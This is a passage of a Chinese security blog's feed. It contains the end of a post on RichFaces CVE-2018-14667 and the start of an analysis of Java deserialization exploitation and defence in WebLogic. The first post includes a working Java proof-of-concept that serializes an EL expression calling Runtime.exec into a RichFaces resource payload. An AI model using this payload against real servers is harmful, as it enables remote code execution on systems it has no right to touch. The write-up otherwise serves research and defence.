+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.jboss.el.ValueExpressionImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.faces.FacesException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.ByteArrayOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.ObjectOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.lang.reflect.Constructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.zip.Deflater&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/**
+ * Created by k1n9 on 2018/11/21 at 11:19.
+ */&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CVE201814667&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Codec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;codec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Codec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;Deflater&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compressor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Deflater&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compressed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;compressor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setInput&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;compressor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;finish&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;totalOut&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compressor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;deflate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compressed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipsrc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;totalOut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;arraycopy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compressed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipsrc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;totalOut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;compressor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;codec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zipsrc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;FacesException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error encode resource data&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;#{request.getClass().getClassLoader().loadClass(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;).invoke(null).exec(\&quot;open /applications/calculator.app\&quot;)}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;org.ajax4jsf.resource.UserResource$UriData&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;Constructor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDeclaredConstructors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+
+        &lt;span class=&quot;nc&quot;&gt;ValueExpression&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ve&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ValueExpressionImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;StateHolderSaver&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stateHolderSaver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StateHolderSaver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;nc&quot;&gt;Reflections&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setFieldValue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;modified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stateHolderSaver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;nc&quot;&gt;ByteArrayOutputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ByteArrayOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;oos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;writeObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toByteArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ISO-8859-1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;参考&quot;&gt;参考&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/3264&quot;&gt;CVE-2018-14667（POC）&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://threathunter.org/topic/5be44bbbf2ad8dd42fb88dfd&quot;&gt;Red Hat JBoss EAP RichFaces - unserialize + el = RCE - 【CVE-2018-14667】&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Tue, 20 Nov 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2018/11/20/richefaces-cve-2018-14667.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/11/20/richefaces-cve-2018-14667.html</guid>
+        
+        <category>Java</category>
+        
+        <category>RichFaces</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>从WebLogic看反序列化漏洞的利用与防御</title>
+        <description>&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;
+&lt;p&gt;上周出的 WebLogic 反序列漏洞，跟进分析的时候发现涉及到不少 Java 反序列化的知识，然后借这个机会把一些 Java 反序列化的利用与防御需要的知识点重新捋一遍，做了一些测试和调试后写成这份报告。文中若有错漏之处，欢迎指出。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x01-java-反序列化时序&quot;&gt;0x01 Java 反序列化时序&lt;/h2&gt;
+
+&lt;p&gt;Java 反序列化时序对于理解 Java 反序列化的利用或是防御都是必要的，例如有些 Gadget 为什么从 readObject 方法开始进行构造，为什么反序列化防御代码写在 resolveClass 方法中等。先写下三个相关的方法。&lt;/p&gt;
+
+&lt;h3 id=&quot;11-readobject&quot;&gt;1.1 readObject&lt;/h3&gt;
+
+&lt;p&gt;这个方法用于读取对象，这里要说的 readObject 跟很多同名的这个方法完全不是一回事的，注意下图中的方法描述符跟其它同名方法的区别。
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b15e18a922773.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;java.io.ObjectInputStream 类的注释中有提到，要是想在序列化或者反序列化的过程中做些别的操作可以通过在类中实现这三个方法来实现。比如类 EvilObj 实现了这里的 readObject 方法（方法的描述符需要跟注释提到的一样）的话，在类 EvilObj 的反序列化过程就会调用到这个 readObject 方法，代码例子：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b88ac18c19438.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其调用栈如下
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b12ed21764351.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看下 readSerialData 方法，在读取序列化数据的时候做判断若是该类实现了 readObject 方法，则通过反射对该方法进行调用。
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b3b0b87619785.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;到这里就能明白为什么有些 Java 反序列化利用的构造是从这里 readObject 方法开始的，然后通过 readObject 中的代码一步一步去构造最终达成利用，这次的 CVE-2018-3191 就是很好的一个例子，后文会讲到 CVE-2018-3191 使用的 Gadget。当然这只是 Java 反序列化利用构造的其中一种方法，更多的可以参考 ysoserial 里的各种 Gadget 的构造。&lt;/p&gt;
+
+&lt;h3 id=&quot;12-resolveclass-和-resolveproxyclass&quot;&gt;1.2 resolveClass 和 resolveProxyClass&lt;/h3&gt;
+
+&lt;p&gt;这两个方法都是在类 java.io.ObjectInputStream 中，resolveClass 用于根据类描述符返回相应的类，resolveProxyClass 用于返回实现了代理类描述符中所有接口的代理类。这两个类的功能使得它们可以被用于 Java 反序列的防御，比如在 resolveClass 方法中可以先对类名进行检测然后决定是否还要继续进行反序列化操作。如果想要在这两个方法中添加一些操作（比如前面提到的做反序列化防御），那处理数据流的类需要继承 java.io.ObjectInputStream ，然后重写下面对应的方法：&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resolveClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ObjectStreamClass&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resolveProxyClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;interfaces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这里需要避免混淆的一点是这两个方法是在处理数据流的类中重写，而不是在被反序列化的类中重写，代码例子：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b890c68c84646.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其调用栈如下
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b3b23e5815126.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;同理 resolveProxyClass 的重写方式也是这样。这里要知道的一点是并非在 Java 的反序列化中都需要调用到这两个方法，看下调用栈前面的 readObject0 方法中的部分代码：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b776b47539492.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看 switch 代码块，假如序列化的是一个 String 对象，往里跟进去是用不到 resolveClass 或 resolveProxyClass 方法的。resolveProxyClass 方法也只是在反序列化代理对象时才会被调用。通过查看序列化数据结构非常有助于理解反序列化的整个流程，推荐一个用于查看序列化数据结构的工具：&lt;a href=&quot;https://github.com/NickstaDB/SerializationDumper&quot;&gt;SerializationDumper&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;13-反序列化时序&quot;&gt;1.3 反序列化时序&lt;/h3&gt;
+
+&lt;p&gt;贴一张廖新喜师傅在“JSON反序列化之殇”议题中的反序列化利用时序图，用于从整体上看反序列化的流程。
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b7a9f05050273.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;普通对象和代理对象的反序列化走的流程是不一样的，可以看 readClassDesc 方法：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b3c628dd29864.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;对应着前面时序图中实例化的那一步的不同流程。&lt;/p&gt;
+
+&lt;h3 id=&quot;14-小结&quot;&gt;1.4 小结&lt;/h3&gt;
+
+&lt;p&gt;这一章主要是介绍了 Java 反序列化相关的三个方法，通过代码跟踪调试的方式来确定其在什么时候会被调用到，再结合反序列化的时序图就可以对反序列化的整个流程有一定的了解。其实去分析了下反序列化的时序主要是为了知道两点，第一个是反序列化的大体流程，第二个是有哪些方法在这流程中有被调用到，为了解 Java 反序列化的利用和防御做一些知识准备。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-weblogi-t3-反序列化及其防御机制&quot;&gt;0x02 WebLogi T3 反序列化及其防御机制&lt;/h2&gt;
+
+&lt;p&gt;T3 从 WebLogic 的启动到对消息进行序列化的调用栈（由下往上）：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;at weblogic.rjvm.InboundMsgAbbrev.readObject(InboundMsgAbbrev.java:73)
+at weblogic.rjvm.InboundMsgAbbrev.read(InboundMsgAbbrev.java:45)
+at weblogic.rjvm.MsgAbbrevJVMConnection.readMsgAbbrevs(MsgAbbrevJVMConnection.java:283)
+at weblogic.rjvm.MsgAbbrevInputStream.init(MsgAbbrevInputStream.java:214)
+at weblogic.rjvm.MsgAbbrevJVMConnection.dispatch(MsgAbbrevJVMConnection.java:498)
+at weblogic.rjvm.t3.MuxableSocketT3.dispatch(MuxableSocketT3.java:348)
+at weblogic.socket.BaseAbstractMuxableSocket.dispatch(BaseAbstractMuxableSocket.java:394)
+at weblogic.socket.SocketMuxer.readReadySocketOnce(SocketMuxer.java:960)
+at weblogic.socket.SocketMuxer.readReadySocket(SocketMuxer.java:897)
+at weblogic.socket.PosixSocketMuxer.processSockets(PosixSocketMuxer.java:130)
+at weblogic.socket.SocketReaderRequest.run(SocketReaderRequest.java:29)
+at weblogic.socket.SocketReaderRequest.execute(SocketReaderRequest.java:42)
+at weblogic.kernel.ExecuteThread.execute(ExecuteThread.java:145)
+at weblogic.kernel.ExecuteThread.run(ExecuteThread.java:117)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这里没有去分析 T3 协议的具体实现，抓了一下 stopWebLogic.sh 在执行过程中的数据包：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b734801533527.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;第一个是握手包，然后第二个包中就可以找到带有序列化数据了，包的前 4 个字节为包的长度。替换序列化数据那部分，然后做数据包重放就可以使得 T3 协议反序列化的数据为自己所构造的了。&lt;/p&gt;
+
+&lt;h3 id=&quot;21-weblogic-的反序列化防御机制&quot;&gt;2.1 WebLogic 的反序列化防御机制&lt;/h3&gt;
+
+&lt;p&gt;从调用栈可以知道是在哪里做的反序列化，InboundMsgAbbrev 类的 readObject 方法：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b111f67d83095.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;留意下这里的 readObject 方法的描述符，跟前一章提的 readObject 方法描述符是不一样的，也就是说假如反序列化一个 InboundMsgAbbrev 对象，这里的 readObject 方法是不会被调用到的。这里的 readObject 只是在 T3 协议处理消息的代码流程中被使用到。&lt;/p&gt;
+
+&lt;p&gt;可以看到处理输入数据流的类为 ServerChannelInputStream，由前一小节知道输入流是可以被控制的，接下来就是实例化 ServerChannelInputStream 对象然后进行反序列化操作。先看下 ServerChannelInputStream 类：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b402957022679.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;ServerChannelInputStream 类的继承图：
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4b7441a6e48784.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以得知 ServerChannelInputStream 类是继承了 ObjectInputstream 类的，并且重写了 resolveClass 和 resolveProxyClass 方法。由上一章的内容可以知道 ServerChannelInputStream 类中的这两个方法在对不同的序列化数据进行反序列化的时候会被调用到，这样就不难理解 WebLogic 为什么会选择在这两个方法中添加做过滤的代码了（其实之前出现的针对反序列化的防御方法也有这么做的，重写 ObjectInputstream 类中的 resolveClass 方法或者直接重写一个 ObjectInputstream）。&lt;/p&gt;
+
